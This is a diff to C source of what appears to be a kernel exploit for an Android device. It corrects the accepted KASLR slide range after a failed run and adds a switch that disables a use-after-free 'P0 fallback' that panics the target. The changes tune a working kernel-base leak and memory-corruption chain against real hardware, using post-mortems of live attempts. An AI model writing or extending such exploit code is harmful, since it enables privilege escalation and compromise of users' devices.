@@ -153,7 +153,11 @@ static const uintptr_t slide_p0_offsets[] = {
  * The old 0x3f8000 bound (e3q/S24 model) can never match on this device:
  * the observed live slide is 0x21c7a00000 (~135 GiB). */
 #define SLIDE_KASLR_SLIDE_MIN 0x1000000000ULL
-#define SLIDE_KASLR_SLIDE_MAX 0x11FFFFFFFFULL
+/* run4.log post-mortem: the live slide 0x1da4000000 (127 GiB) was rejected
+ * because the max bound was mistyped one hex digit short (0x11FFFFFFFF).
+ * Correct range from __pi_kaslr_early_init: 0x1000000000 + (seed & 0x1fffffffff)
+ * → [0x1000000000, 0x2FFFFFFFFF] (68.7 … 206.2 GiB). */
+#define SLIDE_KASLR_SLIDE_MAX 0x2FFFFFFFFFULL
 
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
 static unsigned int slide_tracefs_raw_pages;
@@ -2988,7 +2992,18 @@ int slide_leak_kernel_base(void) {
     if (force_tracefs) {
       return 0;
     }
+#if defined(APP_DISABLE_P0_SLIDE_FALLBACK) && APP_DISABLE_P0_SLIDE_FALLBACK
+    /* run4.log post-mortem: on this target the P0 physical model
+     * (kernel at phys 0x80080000 + slide<=2MiB) is wrong — the kernel loads
+     * at 0xa7000000 with an independent 64–206 GiB virtual slide. Running
+     * the P0 fallback UAF with those targets panics the kernel. Fail the
+     * attempt instead; the supervisor retries tracefs cleanly. */
+    pr_error("slide tracefs failed; P0 fallback disabled for this target; "
+             "aborting attempt\n");
+    return 0;
+#else
     pr_warning("slide tracefs failed; falling back to physical P0\n");
+#endif
   }
   return slide_leak_physical_base();
 #else
